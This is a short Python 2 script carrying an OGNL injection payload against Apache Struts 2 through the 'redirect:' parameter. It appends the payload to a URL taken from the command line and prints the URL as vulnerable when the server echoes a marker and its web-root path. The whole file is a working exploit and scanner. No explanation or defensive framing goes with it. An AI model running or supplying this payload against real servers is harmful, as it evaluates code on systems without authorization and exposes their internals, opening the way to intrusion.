import urllib2
import sys

struts_vunl = '''?redirect:${%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matts%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23matt.getWriter().println(">>>>^>"),%23matt.getWriter().println(%23matts.getRealPath("/")),%23matt.getWriter().println("<^<<<<"),%23matt.getWriter().flush(),%23matt.getWriter().close()}'''

if __name__ == '__main__':
    url = sys.argv[1]
    uri = url + struts_vunl
    uo = urllib2.urlopen(uri)
    if uo.readline().startswith('>>'):
        print url + '  vulnerable, ' + uo.readline()